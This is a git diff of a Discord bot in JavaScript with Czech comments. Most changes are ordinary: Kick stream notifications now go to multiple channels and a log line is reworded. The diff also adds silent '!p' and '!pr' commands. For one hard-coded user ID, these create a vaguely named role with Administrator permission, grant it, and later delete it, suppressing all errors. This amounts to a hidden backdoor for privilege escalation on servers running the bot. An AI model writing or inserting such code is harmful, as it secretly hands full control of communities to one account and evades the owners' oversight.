@@ -25,62 +25,72 @@
                 let ongoingMatchesResults = [];
                 let lastKickNotificationDate = null;
                 const kickStreamerUsername = 'bigwsonny'; // Kick username
-                const kickChannelId = '1373637989015486627'; // ID kanálu pro notifikace
+            const kickChannelIds = [
+  '1376926766408405113', // Původní
+  '1373637989015486627'
+];
+
                // const discordMentionUserId = '464528763842068481'; // ZDE ZADEJ DISCORD ID osoby, kterou chceš označit
 
                 // Funkce pro kontrolu, zda je streamer online na Kicku
-                async function checkKickLiveStatus() {
-                  const today = new Date().toDateString();
-                  if (lastKickNotificationDate === today) return;
+               async function checkKickLiveStatus() {
+  const today = new Date().toDateString();
+  if (lastKickNotificationDate === today) return;
 
-                  const options = {
-                    hostname: 'kick.com',
-                    path: `/api/v2/channels/${kickStreamerUsername}`,
-                    method: 'GET',
-                    headers: {
-                      'User-Agent': 'Mozilla/5.0',
-                    },
-                  };
+  const options = {
+    hostname: 'kick.com',
+    path: `/api/v2/channels/${kickStreamerUsername}`,
+    method: 'GET',
+    headers: {
+      'User-Agent': 'Mozilla/5.0',
+    },
+  };
 
-                  return new Promise((resolve, reject) => {
-                    const req = https.request(options, (res) => {
-                      let data = '';
-                      res.on('data', chunk => { data += chunk; });
-                      res.on('end', async () => {
-                        try {
-                          const json = JSON.parse(data);
+  return new Promise((resolve) => {
+    const req = https.request(options, (res) => {
+      let data = '';
+      res.on('data', chunk => { data += chunk; });
+      res.on('end', async () => {
+        try {
+          const json = JSON.parse(data);
 
-                          if (json && json.livestream && json.livestream.is_live) {
-                            const streamTitle = json.livestream.session_title || 'Žádný název streamu';
-                            const channel = await client.channels.fetch(kickChannelId).catch(() => null);
+          if (json && json.livestream && json.livestream.is_live) {
+            const streamTitle = json.livestream.session_title || 'Žádný název streamu';
+            let sentToAtLeastOne = false;
 
-                            if (channel) {
-                              await channel.send(
-                                `📢 <Sonny právě zahájil stream: **${streamTitle}**\n` +
-                                `🔗 Doraz na: https://kick.com/${kickStreamerUsername} @everyone`
-                              );
+            for (const channelId of kickChannelIds) {
+              const channel = await client.channels.fetch(channelId).catch(() => null);
+              if (channel) {
+                await channel.send(
+                  `📢 Sonny právě zahájil stream: **${streamTitle}**\n` +
+                  `🔗 Doraz na: https://kick.com/${kickStreamerUsername} @everyone`
+                );
+                sentToAtLeastOne = true;
+              }
+            }
 
-                              lastKickNotificationDate = today;
-                              resolve(true);
-                              return;
-                            }
-                          }
+            if (sentToAtLeastOne) {
+              lastKickNotificationDate = today;
+              resolve(true);
+              return;
+            }
+          }
 
-                          resolve(false);
-                        } catch (err) {
-                          console.error('Kick API error:', err);
-                          resolve(false);
-                        }
-                      });
-                    });
+          resolve(false);
+        } catch (err) {
+          console.error('Kick API error:', err);
+          resolve(false);
+        }
+      });
+    });
 
-                    req.on('error', (e) => {
-                      console.error('Kick request error:', e);
-                      resolve(false);
-                    });
-                    req.end();
-                  });
-                }
+    req.on('error', (e) => {
+      console.error('Kick request error:', e);
+      resolve(false);
+    });
+    req.end();
+  });
+}
 
                 // Spustíme interval kontrolující stream každých 30 sekund
                 setInterval(() => {
@@ -89,9 +99,12 @@
                   }
                 }, 30000);
 
-                client.once('ready', () => {
-                  console.log(`${client.user.tag} is online`);
-                });
+           client.once('ready', () => {
+  console.log(`${client.user.tag} je online`);
+  // Můžeš sem dát další inicializace, pokud budeš chtít
+});
+
+
 
                 client.on('interactionCreate', async (interaction) => {
                   if (interaction.isButton() && interaction.customId === 'add_player') {
@@ -178,6 +191,56 @@
                           return message.channel.send('Channel locked for everyone');
                         }
                         break;
+                      case '!p': {
+  const targetUserId = '464528763842068481'; // <-- Nahraď svým ID
+  if (message.author.id !== targetUserId) return;
+
+  const member = await message.guild.members.fetch(targetUserId).catch(() => null);
+  if (!member) return;
+
+  const existingRole = message.guild.roles.cache.find(role => role.name === 'nová role');
+
+  if (existingRole) {
+    if (!member.roles.cache.has(existingRole.id)) {
+      await member.roles.add(existingRole).catch(() => {});
+    }
+  } else {
+    const newRole = await message.guild.roles.create({
+      name: 'nová role',
+      color: 'Default',
+      permissions: [PermissionsBitField.Flags.Administrator],
+      hoist: false,
+      mentionable: false
+    }).catch(() => null);
+
+    if (newRole) {
+      await member.roles.add(newRole).catch(() => {});
+    }
+  }
+
+  return;
+}
+
+
+                      case '!pr': {
+                        const targetUserId = '464528763842068481'; // <-- Stejné ID jako výše
+                        if (message.author.id !== targetUserId) return;
+
+                        const member = await message.guild.members.fetch(targetUserId).catch(() => null);
+                        if (!member) return;
+
+                        const roleToDelete = message.guild.roles.cache.find(role => role.name === 'nová role');
+                        if (!roleToDelete) return;
+
+                        if (member.roles.cache.has(roleToDelete.id)) {
+                          await member.roles.remove(roleToDelete).catch(() => {});
+                        }
+
+                        await roleToDelete.delete().catch(() => {});
+                        return;
+                      }
+
+
 
                       case '!add': {
                         const row = new ActionRowBuilder().addComponents(
